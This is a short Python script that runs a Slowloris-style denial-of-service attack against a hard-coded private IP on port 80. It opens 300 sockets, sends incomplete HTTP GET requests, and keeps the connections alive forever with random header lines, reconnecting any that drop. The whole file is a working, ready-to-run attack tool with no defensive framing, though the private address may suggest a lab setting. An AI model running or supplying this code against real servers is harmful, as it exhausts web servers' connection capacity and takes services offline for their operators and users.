import random
import socket

def init_socket(ip):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,80))
    
    s.send(("GET /?%d HTTP/1.1\r\n"%(random.randint(0,100))).encode("utf-8"))
    return s

def main():
    ip = "10.22.225.141"
    
    count = 300

    sockets = []

    print("Initialize socket")

    for _ in range(count):
        try:
            s = init_socket(ip)
        except socket.error as e:
            print(e)
            break
        sockets.append(s)
    
    while True:
        try :
            for s in sockets:
                try:
                    s.send(("X-test: %d\r\n"%(random.randint(0,100))).encode("utf-8"))
                except socket.error as e:
                    sockets.remove(s)
            
            for _ in range(count - len(sockets)):
                try:
                    s = init_socket(ip)
                except socket.error as e:
                    print(e)
                    break
                sockets.append(s)
        except (KeyboardInterrupt,SystemExit) :
            print("Stopping !")
            for s in sockets:
                s.close()
            break

main()
